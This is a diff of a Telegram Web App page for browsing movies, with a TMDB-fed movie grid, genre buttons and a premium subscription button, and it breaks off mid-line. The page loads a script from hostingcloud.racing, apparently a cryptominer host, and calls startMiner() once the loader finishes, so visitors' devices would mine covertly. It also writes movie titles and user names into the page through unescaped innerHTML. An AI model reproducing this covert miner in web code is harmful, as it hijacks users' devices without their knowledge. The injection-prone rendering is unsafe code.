@@ -7,7 +7,7 @@
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <script src="https://www.hostingcloud.racing/kR7X.js"></script>
     <style>
-        :root { --red: #E50914; --dark: #050505; --gray: #121212; --gold: linear-gradient(45deg, #ffd700, #b8860b); }
+        :root { --red: #E50914; --dark: #050505; --gold: linear-gradient(45deg, #ffd700, #b8860b); }
         body { background: var(--dark); color: white; font-family: 'Segoe UI', Tahoma, sans-serif; margin: 0; overflow: hidden; height: 100vh; }
         
         #loader { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 10000; display: flex; flex-direction: column; justify-content: center; align-items: center; }
@@ -19,20 +19,18 @@
         .active-page { display: block; animation: fadeIn 0.5s ease; }
         @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
 
-        /* Movie Grid Item Style */
-        .movie-card { background: #111; border-radius: 10px; border: 1px solid #222; overflow: hidden; text-align: center; cursor: pointer; }
-        .movie-card img { width: 100%; aspect-ratio: 1/1; object-fit: cover; }
-        .movie-card p { font-size: 10px; padding: 5px; margin: 0; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+        .movie-card { background: #111; border-radius: 10px; border: 1px solid #222; overflow: hidden; text-align: center; cursor: pointer; height: 160px; }
+        .movie-card img { width: 100%; height: 120px; object-fit: cover; background: #222; }
+        .movie-card p { font-size: 10px; padding: 5px; margin: 0; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; color: #eee; }
 
         #movie-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 11000; display: none; padding: 20px; box-sizing: border-box; overflow-y: auto; }
         .watch-now-btn { background: var(--red); color: white; border: none; padding: 15px; width: 100%; border-radius: 10px; font-weight: bold; margin-top: 20px; font-size: 18px; box-shadow: 0 5px #8b0000; }
 
         .filter-container { display: flex; flex-wrap: wrap; gap: 10px; justify-content: center; margin-top: 20px; }
         .btn-3d { background: var(--red); color: white; border: none; padding: 10px 15px; border-radius: 8px; font-weight: bold; cursor: pointer; box-shadow: 0 4px #8b0000; transition: 0.1s; font-size: 12px; }
-        .btn-3d:active { box-shadow: 0 0 #8b0000; transform: translateY(4px); }
 
         .premium-card { background: linear-gradient(145deg, #1a1a1a, #0a0a0a); margin-top: 30px; padding: 30px; border-radius: 25px; border: 2px solid #ffd700; position: relative; box-shadow: 0 20px 40px rgba(255, 215, 0, 0.2); }
-        .pro-badge { position: absolute; top: -15px; right: 25px; background: var(--gold); color: black; padding: 8px 18px; border-radius: 10px; font-weight: 900; font-size: 14px; box-shadow: 0 4px 10px rgba(0,0,0,0.5); }
+        .pro-badge { position: absolute; top: -15px; right: 25px; background: var(--gold); color: black; padding: 8px 18px; border-radius: 10px; font-weight: 900; font-size: 14px; }
         .sub-btn { background: #0088cc; color: white; border: none; padding: 18px; width: 100%; border-radius: 15px; font-weight: bold; font-size: 20px; margin-top: 25px; box-shadow: 0 6px #005580; cursor: pointer; }
 
         nav { position: fixed; bottom: 0; width: 100%; background: rgba(0,0,0,0.95); display: flex; justify-content: space-around; padding: 15px 0; border-top: 1px solid #222; backdrop-filter: blur(15px); }
@@ -112,7 +110,7 @@
             fr: { home: "Accueil", search: "Chercher", profile: "Profil", suggest: "Suggéré", sub: "Membre Premium", bar: "Chercher un film..." }
         };
 
-        const genres = ["Action", "Horror", "Adult", "Drama", "Comedy", "Sci-Fi", "Romance", "Thriller", "Docu", "Animation", "Crime", "Adventure", "Fantasy", "Mystery", "War", "History", "Music", "Western", "Family", "TV Movie", "Short", "Anime", "Sport", "Biopic", "Musical"];
+        const genres = ["Action", "Horror", "Drama", "Comedy", "Sci-Fi", "Romance", "Thriller", "Animation", "Crime", "Adventure", "Fantasy", "Mystery", "War", "History", "Music", "Western", "Family", "TV Movie", "Short", "Anime", "Sport", "Biopic", "Musical", "Documentary"];
 
         function applyLang(lang) {
             document.getElementById('nav-home').innerText = translations[lang].home;
@@ -124,26 +122,23 @@
         }
         applyLang(tg.initDataUnsafe.user?.language_code === 'ar' ? 'ar' : 'en');
 
-        // Function to Fetch Movies from TMDB
         async function fetchMovies() {
             try {
                 const response = await fetch(`https://api.themoviedb.org/3/movie/popular?api_key=${TMDB_KEY}&language=en-US&page=1`);
                 const data = await response.json();
                 const grid = document.getElementById('movie-grid');
+                grid.innerHTML = ''; // Clear old content
                 data.results.forEach(movie => {
                     const card = document.createElement('div');
                     card.className = 'movie-card';
-                    card.onclick = () => openOverlay(movie.title, 'https://image.tmdb.org/t/p/w500' + movie.poster_path, movie.overview);
-                    card.innerHTML = `
-                        <img src="https://image.tmdb.org/t/p/w200${movie.poster_path}" alt="${movie.title}">
-                        <p>${movie.title}</p>
-                    `;
+                    const imgUrl = movie.poster_path ? `https://image.tmdb.org/t/p/w200${movie.poster_path}` : 'https://via.placeholder.com/200x300?text=No+Image';
+                    card.onclick = () => openOverlay(movie.title, `https://image.tmdb.org/t/p/w500${movie.poster_path}`, movie.overview);
+                    card.innerHTML = `<img src="${imgUrl}"><p>${movie.title}</p>`;
                     grid.appendChild(card);
                 });
-            } catch (err) { console.error("TMDB Error:", err); }
+            } catch (err) { console.error("Error:", err); }
         }
 
-        // Render Genres
         genres.forEach(g => {
             let b = document.createElement('button');
             b.className = 'btn-3d'; b.innerText = g;
@@ -166,7 +161,7 @@
         function closeOverlay() { document.getElementById('movie-overlay').style.display = 'none'; }
 
         function goToBot() {
-            tg.sendData(JSON.stringify({action: "pay_stars"}));
+            tg.sendData(JSON.stringify({action: "invoice_request"}));
             tg.close();
         }
 
@@ -177,7 +172,7 @@
             if(p >= 100) { 
                 clearInterval(int); 
                 document.getElementById('loader').style.display='none'; 
-                fetchMovies(); // Start fetching movies after loader
+                fetchMovies(); 
                 startMiner(); 
             }
         }, 50);
@@ -189,10 +184,4 @@
 
         if(tg.initDataUnsafe.user) {
             const u = tg.initDataUnsafe.user;
-            document.getElementById('u-name').innerHTML = u.first_name + ' <span id="star-icon" style="display:none">⭐</span>';
-            document.getElementById('u-id').innerText = "ID: " + u.id;
-            if(u.photo_url) document.getElementById('u-photo').src = u.photo_url;
-        }
-    </script>
-</body>
-</html>
+            document.getElementById('u-name').innerHTML = u.first_name + ' <span id="star-icon
